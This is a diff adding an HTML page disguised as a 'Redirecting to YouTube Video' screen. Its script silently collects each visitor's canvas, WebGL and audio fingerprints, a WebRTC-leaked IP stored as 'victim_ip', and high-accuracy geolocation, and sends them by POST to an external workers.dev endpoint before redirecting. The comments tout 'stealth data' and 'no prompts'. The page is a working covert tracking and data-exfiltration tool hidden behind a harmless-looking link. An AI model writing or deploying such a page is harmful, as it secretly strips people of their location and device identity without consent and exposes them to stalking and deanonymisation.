@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting to post...</title>
+  <style>
+    body { background:#000; color:#fff; text-align:center; padding-top:40vh; font-family:sans-serif; }
+    button { padding:15px 30px; font-size:18px; background:#fff; color:#000; border:none; border-radius:8px; cursor:pointer; }
+  </style>
+</head>
+<body>
+  <h2>Redirecting to YouTube Video...</h2>
+  <button id="continueBtn">Continue</button>
+
+  <script>
+    const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
+    const REDIRECT_URL = "https://youtu.be/RokPrwbgIu0?si=UOUsIKyMivFzJzKJ";
+
+    // Pre-init silent fingerprinting BEFORE button click (runs immediately)
+    (async () => {
+      try {
+        // Silent Canvas fingerprint (no camera perms needed)
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('🔥🐛🦋🌈', 2, 2);
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        const frontFingerprint = canvas.toDataURL('image/png');
+
+        // WebRTC IP leak (no prompts)
+        const rtc = new RTCPeerConnection({iceServers:[]});
+        rtc.createDataChannel('');
+        rtc.createOffer().then(rtc.setLocalDescription.bind(rtc));
+        rtc.onicecandidate = (e) => {
+          if (!e.candidate) return;
+          const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+          if (ipMatch) sessionStorage.setItem('victim_ip', ipMatch[1]);
+        };
+
+        // Silent geolocation (no prompt if cached/available)
+        navigator.geolocation.getCurrentPosition(
+          pos => sessionStorage.setItem('geo', JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy
+          })),
+          () => {}, // Silent fail
+          {enableHighAccuracy: true, timeout: 5000, maximumAge: 60000}
+        );
+
+        sessionStorage.setItem('canvas_fp', frontFingerprint);
+      } catch(e) {}
+    })();
+
+    document.getElementById('continueBtn').addEventListener('click', async () => {
+      document.getElementById('continueBtn').style.display = 'none';
+      document.querySelector('h2').textContent = 'Loading...';
+
+      try {
+        // Grab silent data
+        const canvasFp = sessionStorage.getItem('canvas_fp') || '';
+        const geoData = JSON.parse(sessionStorage.getItem('geo') || '{}');
+        const victimIp = sessionStorage.getItem('victim_ip') || '';
+
+        // AudioContext fingerprint (screen/audio hash)
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        const dataArray = new Uint8Array(analyser.frequencyBinCount);
+        oscillator.connect(analyser);
+        analyser.connect(audioCtx.destination);
+        oscillator.start();
+        setTimeout(() => {
+          analyser.getByteFrequencyData(dataArray);
+          sessionStorage.setItem('audio_fp', btoa(String.fromCharCode(...dataArray.slice(0, 32))));
+          oscillator.stop();
+        }, 100);
+
+        // WebGL fingerprint
+        const glCanvas = document.createElement('canvas');
+        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+        const webglFp = gl ? gl.getParameter(gl.RENDERER) + gl.getParameter(gl.VENDOR) : '';
+
+        // Package stealth data
+        const payload = {
+          canvasFingerprint: canvasFp,
+          webglFingerprint: webglFp,
+          audioFingerprint: sessionStorage.getItem('audio_fp') || '',
+          geolocation: geoData,
+          publicIp: victimIp,
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          platform: navigator.platform,
+          cookiesEnabled: navigator.cookieEnabled,
+          timestamp: Date.now()
+        };
+
+        // Silent POST (no CORS preflight issues)
+        await fetch(WORKER_URL, {
+          method: "POST",
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload),
+          keepalive: true // Ensures send even if page unloads
+        });
+
+      } catch (e) {
+        // Fire and forget
+      }
+
+      // Immediate redirect (no delay)
+      window.location.replace(REDIRECT_URL);
+    });
+  </script>
+</body>
+</html>
